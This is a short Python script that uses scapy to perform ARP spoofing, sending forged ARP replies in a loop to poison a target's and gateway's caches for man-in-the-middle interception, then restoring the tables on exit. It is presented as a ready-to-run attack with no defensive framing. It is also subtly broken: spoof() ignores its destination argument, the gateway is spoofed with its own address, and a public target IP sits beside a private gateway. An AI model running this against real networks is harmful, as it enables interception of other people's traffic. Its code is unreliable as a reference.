import subprocess
import scapy.all as scapy
import time
     
def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc
     
     
def spoof(target_mac, spoof_ip):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)
     
     
def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source)
    scapy.send(packet, count=4, verbose=False)
     
     
target_ip = '75.143.179.251'
gateway_ip = '192.168.0.1'
     
target_mac = get_mac(target_ip)
gateway_mac = get_mac(gateway_ip)
     
     
try:
    sent_packets_count = 0
    while True:
        spoof(target_mac, gateway_ip)
        spoof(gateway_mac, gateway_ip)
        sent_packets_count += 2
        print('\r[+] Packet sent: ' + str(sent_packets_count))
        time.sleep(2)
except KeyboardInterrupt:
    print('\n[+] Dectected CTRL C - Quitting')
    print('[+] restoring ARP tables')
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)